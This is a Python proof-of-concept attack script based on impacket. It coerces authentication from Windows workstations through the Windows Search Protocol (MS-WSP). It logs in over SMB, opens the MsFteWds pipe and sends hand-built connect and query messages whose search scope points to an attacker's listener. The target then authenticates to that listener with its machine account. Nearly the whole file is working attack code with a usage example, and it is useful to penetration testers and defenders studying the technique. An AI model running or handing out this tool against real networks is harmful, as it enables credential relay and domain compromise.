#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Proof of concept for coercing authentication with the Windows Search Protocol
# (MS-WSP).
#
# MS-WSP is a message-based protocol (not DCERPC/opnum) spoken over the SMB named
# pipe \pipe\MSFTEWDS. A client sends a CPMConnectIn to attach to the remote
# host's Windows Search catalog, then a CPMCreateQueryIn carrying a query whose
# scope/restriction references a UNC path. The remote Windows Search service
# resolves that path and connects out to it over SMB, authenticating as the
# target's machine account -- an authentication coercion.
#
# Requirements (see the referenced projects):
#   - a domain user context (no special privilege on the target)
#   - TCP/445 reachable on target and listener
#   - the Windows Search service running on the target (\pipe\MSFTEWDS present).
#     It is NOT enabled by default on Windows Server, so in practice this affects
#     Windows workstations.
#
# Technique / references:
#   - slemire/WSPCoerce            (original PoC, OLE DB provider): https://github.com/slemire/WSPCoerce
#   - RedTeamPentesting/wspcoerce   (MIT, impacket implementation this PoC is based on):
#     https://github.com/RedTeamPentesting/wspcoerce
#   - [MS-WSP]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsp/
#
#   ./coerce_poc.py -d LAB.local -u user -p 'Password123!' 'file:////192.168.1.10/x' WORKSTATION1
#     (positional order: <listener_uri> <target> ; target must be a hostname, not an IP)
import sys
import struct
import uuid
import argparse

from impacket.smbconnection import SMBConnection, SessionError
from impacket.smb3structs import (
    FSCTL_PIPE_TRANSCEIVE, SMB2_0_IOCTL_IS_FSCTL, FILE_READ_DATA, FILE_SHARE_READ,
)

# --- MS-WSP constants (subset) ---
CPMCONNECT = 0x000000C8
CPMDISCONNECT = 0x000000C9
CPMCREATEQUERY = 0x000000CA
XOR_CONST = 0x59533959
WSP_DEFAULT_LCID = 0x00000409
DBPROPSET_FSCIFRMWRK_EXT = uuid.UUID("A9BD1526-6A80-11D0-8C9D-0020AF1D740E")
NULL_UUID = uuid.UUID("00000000-0000-0000-0000-000000000000")
DBPROP_CI_CATALOG_NAME = 0x00000002
VT_BSTR = 0x0008
PRSPEC_PROPID = 0x00000001
RTPROPERTY = 0x00000005
PREQ = 0x00000004


def _align(buf, n):
    while len(buf) % n:
        buf.extend(b"\x00")


def _add_align(buf, data, n):
    _align(buf, n)
    buf.extend(data)


def _checksum(body, msg):
    c = sum(int.from_bytes(body[i:i + 4], "little") for i in range(0, len(body), 4))
    c ^= XOR_CONST
    c -= msg
    return c & 0xFFFFFFFF


def _header(msg, body):
    return struct.pack("<IIII", msg, 0, _checksum(body, msg), 0) + body


def build_connect_in(machine_name, user_name):
    """CPMConnectIn -- attach to the remote 'Windows\\SYSTEMINDEX' catalog."""
    b = bytearray()
    b.extend(struct.pack("<I", 0x00010700))  # _iClientVersion
    b.extend(struct.pack("<I", 0x00000001))  # _fClientIsRemote

    blob1 = bytearray(struct.pack("<I", 0))   # cPropSets = 0 (no default propsets)
    b.extend(struct.pack("<I", len(blob1)))

    # blob2: one CPropSet (DBPROPSET_FSCIFRMWRK_EXT) with DBPROP_CI_CATALOG_NAME
    blob2 = bytearray()
    _add_align(blob2, struct.pack("<I", 1), 8)                 # cPropSets = 1
    blob2.extend(DBPROPSET_FSCIFRMWRK_EXT.bytes_le)            # guidPropertySet
    _add_align(blob2, struct.pack("<I", 1), 4)                 # cProperties = 1
    _align(blob2, 4)
    blob2.extend(struct.pack("<I", DBPROP_CI_CATALOG_NAME))    # DBPROPID
    blob2.extend(struct.pack("<I", 0))                         # DBPROPOPTIONS
    blob2.extend(struct.pack("<I", 0))                         # DBPROPSTATUS
    blob2.extend(struct.pack("<I", 0))                         # colid.eKind
    _add_align(blob2, NULL_UUID.bytes_le, 8)                   # colid.GUID
    blob2.extend(struct.pack("<I", 0))                         # colid.ulId
    # CBaseStorageVariant: VT_BSTR "Windows\SYSTEMINDEX"
    blob2.extend(struct.pack("<H", VT_BSTR))
    blob2.extend(struct.pack("<BB", 0, 0))
    s = ("Windows\\SYSTEMINDEX" + "\0").encode("utf-16le")
    blob2.extend(struct.pack("<I", len(s)))
    blob2.extend(s)

    _add_align(b, struct.pack("<I", len(blob2)), 8)
    b.extend(bytes(12))                                        # _cbBlob2 padding/reserved

    b.extend((machine_name + "\0").encode("utf-16le"))
    b.extend((user_name + "\0").encode("utf-16le"))
    _align(b, 8)
    b.extend(blob1)
    _align(b, 8)
    b.extend(blob2)
    b.extend(bytes(4))
    return _header(CPMCONNECT, bytes(b))


def build_create_query_in(target_uri):
    """CPMCreateQueryIn -- a property restriction whose value is the UNC/URI scope."""
    b = bytearray()
    b.extend(struct.pack("<I", 0))          # size placeholder

    b.append(0x01)                          # CColumnSetPresent
    _align(b, 4)
    b.extend(struct.pack("<I", 1))          # CColumnSet count
    b.extend(struct.pack("<I", 0))          # index 0

    b.append(0x01)                          # CRestrictionPresent
    # CRestrictionArray: 1 restriction
    b.append(1)                             # count
    b.append(1)                             # present flag
    _align(b, 4)
    # CRestriction
    b.extend(struct.pack("<I", RTPROPERTY))
    b.extend(struct.pack("<I", 1000))       # Weight
    # CPropertyRestriction
    b.extend(struct.pack("<I", PREQ))       # relop
    # PropSpec (System.Search.Scope-ish; b725f130-... propid 0x16)
    _add_align(b, uuid.UUID("b725f130-47ef-101a-a5f1-02608c9eebac").bytes_le, 8)
    b.extend(struct.pack("<II", PRSPEC_PROPID, 0x16))
    _align(b, 4)
    b.extend(struct.pack("<I", 0x1F))       # VT_LPWSTR
    sb = (target_uri + "\0").encode("utf-16le")
    b.extend(struct.pack("<I", len(sb) // 2))
    b.extend(sb)
    _add_align(b, struct.pack("<I", WSP_DEFAULT_LCID), 4)

    b.append(0x00)                          # CSortSetPresent
    b.append(0x00)                          # CCategorizationSetPresent
    _align(b, 4)
    # CRowsetProperties
    b.extend(struct.pack("<IIIII", 0x00000001, 0, 0, 10, 30))
    # CPidMapper: one PropSpec (NULL guid, propid 0x16)
    b.extend(struct.pack("<I", 1))
    _add_align(b, NULL_UUID.bytes_le, 8)
    b.extend(struct.pack("<II", PRSPEC_PROPID, 0x16))
    # CColumnGroupArray
    b.extend(struct.pack("<I", 0))
    # Locale
    b.extend(struct.pack("<I", WSP_DEFAULT_LCID))

    b[0:4] = struct.pack("<I", len(b))
    return _header(CPMCREATEQUERY, bytes(b))


def build_disconnect():
    return _header(CPMDISCONNECT, b"")


def main():
    p = argparse.ArgumentParser(add_help=True, description="Coerce authentication via MS-WSP")
    p.add_argument("-u", "--username", default="")
    p.add_argument("-p", "--password", default="")
    p.add_argument("-d", "--domain", default="")
    p.add_argument("--hashes", metavar="[LM]:NT")
    p.add_argument("--target-ip", help="IP of the target (target arg must stay a hostname for WSP)")
    p.add_argument("-local-name", default="NotUsed", help="MachineName sent in CPMConnectIn (unused by server)")
    p.add_argument("listener", help="listener URI, e.g. file:////192.168.1.10/x")
    p.add_argument("target", help="target hostname (NOT an IP address)")
    o = p.parse_args()
    lm, nt = ("", "")
    if o.hashes:
        lm, nt = o.hashes.split(":")

    smb = SMBConnection(o.target, o.target_ip or o.target, sess_port=445)
    smb.login(o.username, o.password, o.domain, lm, nt)
    print("[>] Authenticated; opening \\pipe\\MSFTEWDS on %s ..." % o.target)
    tid = smb.connectTree("IPC$")
    try:
        fid = smb.createFile(tid, "MsFteWds", FILE_READ_DATA, FILE_SHARE_READ)
    except SessionError as e:
        if "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
            print("[!] MsFteWds pipe not available -- the Windows Search service is not running "
                  "(default on Windows Server). This coercion targets Windows workstations.")
            sys.exit(1)
        raise

    conn = smb._SMBConnection
    print("[>] Sending CPMConnectIn ...")
    conn.ioctl(tid, fid, FSCTL_PIPE_TRANSCEIVE, SMB2_0_IOCTL_IS_FSCTL,
               build_connect_in(o.local_name, o.username or "user"), 0, 40)
    print("[>] Sending CPMCreateQueryIn (scope = %s) ..." % o.listener)
    conn.ioctl(tid, fid, FSCTL_PIPE_TRANSCEIVE, SMB2_0_IOCTL_IS_FSCTL,
               build_create_query_in(o.listener), 0, 40)
    print("[>] Sending CPMDisconnect ...")
    try:
        conn.ioctl(tid, fid, FSCTL_PIPE_TRANSCEIVE, SMB2_0_IOCTL_IS_FSCTL,
                   build_disconnect(), 0, 40)
    except Exception:
        pass
    print("[+] Query sent. Check your listener for the target machine account.")
    smb.closeFile(tid, fid)
    smb.disconnectTree(tid)
    smb.logoff()


if __name__ == "__main__":
    main()
